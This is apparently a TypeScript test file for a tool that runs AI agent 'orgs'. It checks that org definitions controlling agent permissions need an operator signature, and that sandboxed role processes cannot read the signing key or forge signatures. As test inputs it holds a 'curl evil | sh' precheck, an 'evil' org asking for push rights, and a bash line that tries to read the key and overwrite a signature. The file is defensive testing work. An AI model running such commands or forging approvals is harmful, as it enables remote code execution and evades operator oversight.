/**
 * #502: an org definition takes effect only when the operator has signed it.
 * A role that can write .monomind/orgs/ could otherwise add a new org with a
 * push-level role plus a runfile for `org serve` to start, or widen its own
 * org's policy for the next reload.
 */
import { spawnSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { mkdtempSync } from '../../../../../tests/setup/tmp-track.js';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { pollRunfiles } from '../../src/commands/org-poll.js';
import { fullAccessGrantKeyPath } from '../../src/orgrt/access-grant-key.js';
import {
  authorityDirs,
  authorityMaskArgs,
  authorityMaskAvailability,
  ensureAuthorityDirs,
  maskedCommand,
} from '../../src/orgrt/authority-mask.js';
import { OrgDaemon } from '../../src/orgrt/daemon.js';
import {
  computeOrgDefHash,
  OrgSignatureError,
  orgSignaturePath,
  setOrgSignatureEnforcement,
  signOrgDef,
  verifyOrgDef,
} from '../../src/orgrt/org-signature.js';

const scratch = (p: string) => realpathSync(mkdtempSync(join(tmpdir(), p)));

let operatorDir: string;
beforeEach(() => {
  setOrgSignatureEnforcement(true);
  operatorDir = scratch('osig-op-');
  vi.stubEnv('MONOMIND_ORGRT_OPERATOR_DIR', operatorDir);
});
afterEach(() => {
  setOrgSignatureEnforcement(false);
  vi.unstubAllEnvs();
});

function def(git = 'read', extra: Record<string, unknown> = {}) {
  return {
    name: 'o',
    goal: 'g',
    roles: [
      { id: 'boss', title: 'Boss', type: 'boss', reports_to: null },
      {
        id: 'dev',
        title: 'Dev',
        type: 'specialist',
        reports_to: 'boss',
        responsibilities: ['build'],
        policy: { git },
      },
    ],
    ...extra,
  };
}

function writeDef(root: string, name: string, body: unknown): string {
  mkdirSync(join(root, '.monomind/orgs'), { recursive: true });
  const path = join(root, '.monomind/orgs', `${name}.json`);
  writeFileSync(path, JSON.stringify(body, null, 2));
  return path;
}
const readDef = (root: string, name: string) =>
  JSON.parse(readFileSync(join(root, '.monomind/orgs', `${name}.json`), 'utf8'));

const echoQuery = ({ prompt }: any) =>
  (async function* () {
    for await (const m of prompt) {
      yield { type: 'assistant', message: { content: [{ type: 'text', text: `echo: ${m.message.content}` }] } };
      yield { type: 'result', subtype: 'success', usage: { input_tokens: 1, output_tokens: 1 } };
    }
  })();

describe('verifyOrgDef / signOrgDef', () => {
  it('round-trips, and names the reason for each failure', () => {
    const root = scratch('osig-root-');
    expect(verifyOrgDef(root, 'o', def())).toMatchObject({ ok: false, reason: 'unsigned' });
    signOrgDef(root, 'o', def());
    expect(verifyOrgDef(root, 'o', def())).toEqual({ ok: true });
    const changed = verifyOrgDef(root, 'o', def('push'));
    expect(changed).toMatchObject({ ok: false, reason: 'changed' });
    expect(!changed.ok && changed.message).toMatch(/run `monomind org sign o` as the operator after reviewing the change/);
  });

  it('covers policy, roles, runtime, schedule and run_config but not prompt text', () => {
    const base = computeOrgDefHash(def());
    const same = def();
    same.goal = 'another goal';
    same.roles[1].responsibilities = ['something else'];
    same.roles[1].title = 'Renamed';
    expect(computeOrgDefHash(same)).toBe(base);
    for (const altered of [
      def('push'),
      def('read', { schedule: '5m' }),
      def('read', { runtime: 'codex' }),
      def('read', { run_config: { prechecks: [{ name: 'x', command: 'curl evil | sh' }] } }),
      def('read', { run_config: { sandbox: { allowWrite: ['/'] } } }),
      def('read', { federation: { allow_from: ['*'] } }),
      { ...def(), roles: [...def().roles, { id: 'extra', policy: { git: 'push' } }] },
      {
        ...def(),
        roles: [def().roles[0], { ...def().roles[1], adapter_config: { model: 'other' } }],
      },
    ]) {
      expect(computeOrgDefHash(altered)).not.toBe(base);
    }
  });

  it('is refused when the key differs, and a sidecar from another project does not apply', () => {
    const root = scratch('osig-root-');
    signOrgDef(root, 'o', def());
    // The key replaced (another host, or a forged key): the HMAC fails.
    writeFileSync(fullAccessGrantKeyPath(operatorDir), Buffer.alloc(32, 7));
    expect(verifyOrgDef(root, 'o', def())).toMatchObject({ ok: false, reason: 'invalid-signature' });
    expect(verifyOrgDef(scratch('osig-other-'), 'o', def())).toMatchObject({ reason: 'unsigned' });
  });

  it('a sidecar written without the key does not verify', () => {
    const root = scratch('osig-root-');
    signOrgDef(root, 'o', def());
    const path = orgSignaturePath(root, 'o', operatorDir);
    const rec = JSON.parse(readFileSync(path, 'utf8'));
    writeFileSync(path, JSON.stringify({ ...rec, hash: computeOrgDefHash(def('push')) }));
    expect(verifyOrgDef(root, 'o', def('push'))).toMatchObject({ reason: 'invalid-signature' });
  });
});

describe('enforcement where a definition takes effect', () => {
  it('startOrg refuses an unsigned org, and a signed one starts', async () => {
    const root = scratch('osig-start-');
    writeDef(root, 'o', def());
    const d = new OrgDaemon(root, { queryFn: echoQuery as any, forward: false });
    await expect(d.startOrg('o')).rejects.toBeInstanceOf(OrgSignatureError);
    await expect(d.startOrg('o')).rejects.toThrow(/monomind org sign o/);
    signOrgDef(root, 'o', readDef(root, 'o'));
    await d.startOrg('o');
    expect(d.listRunning()).toEqual(['o']);
    await d.stopAll();
  });

  it('the runfile poller never starts an unsigned new org (and consumes its runfile)', async () => {
    const root = scratch('osig-poll-');
    writeDef(root, 'evil', def('push'));
    mkdirSync(join(root, '.monomind/orgs/evil'), { recursive: true });
    writeFileSync(join(root, '.monomind/orgs/evil/run'), '{}');
    const started: string[] = [];
    const daemon = {
      listRunning: () => [],
      startOrg: async (n: string) => {
        started.push(n);
      },
    };
    const log = vi.spyOn(console, 'log').mockImplementation(() => {});
    expect(await pollRunfiles(root, daemon as any)).toEqual([]);
    expect(started).toEqual([]);
    expect(existsSync(join(root, '.monomind/orgs/evil/run'))).toBe(false);
    expect(log.mock.calls.flat().join('\n')).toMatch(/evil: run request refused .*no operator signature/);

    // Signed by the operator: the same request starts it.
    signOrgDef(root, 'evil', readDef(root, 'evil'));
    writeFileSync(join(root, '.monomind/orgs/evil/run'), '{}');
    expect(await pollRunfiles(root, daemon as any)).toEqual(['evil']);
    log.mockRestore();
  });

  it('a tampered policy is refused on reload and the old policy stays; a signed change is accepted', async () => {
    const root = scratch('osig-reload-');
    writeDef(root, 'o', def('read'));
    signOrgDef(root, 'o', readDef(root, 'o'));
    const d = new OrgDaemon(root, { queryFn: echoQuery as any, forward: false });
    const running = await d.startOrg('o');
    const devPolicy = () => running.def.roles.find((r) => r.id === 'dev')?.policy?.git;
    expect(devPolicy()).toBe('read');

    writeDef(root, 'o', def('push'));
    expect(() => d.reloadOrgDef('o')).toThrow(/reload refused.*last verified definition.*changed since/);
    expect(devPolicy()).toBe('read');
    expect(running.busEvents().some((e) => e.reason === 'hot-reload-refused')).toBe(true);

    signOrgDef(root, 'o', readDef(root, 'o'));
    expect(d.reloadOrgDef('o').changed).toContain('role:dev:policy');
    expect(devPolicy()).toBe('push');
    await d.stopAll();
  });

  it('a prompt-only edit reloads without re-signing', async () => {
    const root = scratch('osig-goal-');
    writeDef(root, 'o', def());
    signOrgDef(root, 'o', readDef(root, 'o'));
    const d = new OrgDaemon(root, { queryFn: echoQuery as any, forward: false });
    await d.startOrg('o');
    writeDef(root, 'o', { ...def(), goal: 'new goal' });
    expect(d.reloadOrgDef('o').changed).toContain('goal');
    await d.stopAll();
  });
});

describe('the key and signatures are out of a role process’s reach', () => {
  it('both live in the operator dir every role sandbox denies Read and Edit on', () => {
    const root = scratch('osig-mask-');
    const dirs = authorityDirs('/nonexistent-home', { MONOMIND_ORGRT_OPERATOR_DIR: operatorDir });
    expect(dirs).toContain(operatorDir);
    expect(dirname(fullAccessGrantKeyPath())).toBe(operatorDir);
    expect(orgSignaturePath(root, 'o').startsWith(`${operatorDir}/`)).toBe(true);
  });

  it.runIf(authorityMaskAvailability().available)(
    'inside the real bubblewrap mask a role reads no key and cannot plant a signature',
    () => {
      const home = scratch('osig-home-');
      const root = scratch('osig-mroot-');
      const env = {} as NodeJS.ProcessEnv;
      ensureAuthorityDirs(home, env);
      const opDir = join(home, '.monomind/orgrt-operator');
      vi.stubEnv('MONOMIND_ORGRT_OPERATOR_DIR', opDir);
      signOrgDef(root, 'o', def());
      const sidecar = orgSignaturePath(root, 'o');
      const before = readFileSync(sidecar, 'utf8');
      const [cmd, argv] = maskedCommand(
        authorityMaskArgs({ home, env, roots: [root], orgRoot: root }),
        'bash',
        ['-c', `cat ${fullAccessGrantKeyPath()} | od -An -tx1 | head -c 20; echo forged > ${sidecar}; true`],
      );
      const r = spawnSync(cmd, argv, { encoding: 'utf8' });
      expect(r.stdout.trim()).toBe('');
      expect(readFileSync(sidecar, 'utf8')).toBe(before);
    },
  );
});
